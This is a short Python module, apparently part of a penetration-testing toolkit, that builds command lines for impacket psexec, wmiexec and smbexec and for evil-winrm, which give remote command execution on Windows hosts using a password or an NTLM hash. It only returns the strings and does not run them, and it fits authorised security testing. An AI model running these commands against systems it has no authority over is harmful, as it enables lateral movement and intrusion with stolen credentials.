"""Lateral-movement command helpers via impacket.

Returns the argv for ``psexec.py`` / ``smbexec.py`` / ``wmiexec.py`` so the
tester can run them. We do not invoke them.
"""

from __future__ import annotations

import shlex


def impacket_psexec(*, domain: str, user: str, secret: str, target: str) -> str:
    """Returns the shell command. ``secret`` may be a password or NTLM hash."""
    return shlex.join(
        ["impacket-psexec", f"{domain}/{user}:{secret}@{target}"]
    )


def impacket_wmiexec(*, domain: str, user: str, secret: str, target: str) -> str:
    return shlex.join(
        ["impacket-wmiexec", f"{domain}/{user}:{secret}@{target}"]
    )


def impacket_smbexec(*, domain: str, user: str, secret: str, target: str) -> str:
    return shlex.join(
        ["impacket-smbexec", f"{domain}/{user}:{secret}@{target}"]
    )


def evil_winrm(*, target: str, user: str, secret: str, hash_auth: bool = False) -> str:
    if hash_auth:
        return shlex.join(["evil-winrm", "-i", target, "-u", user, "-H", secret])
    return shlex.join(["evil-winrm", "-i", target, "-u", user, "-p", secret])
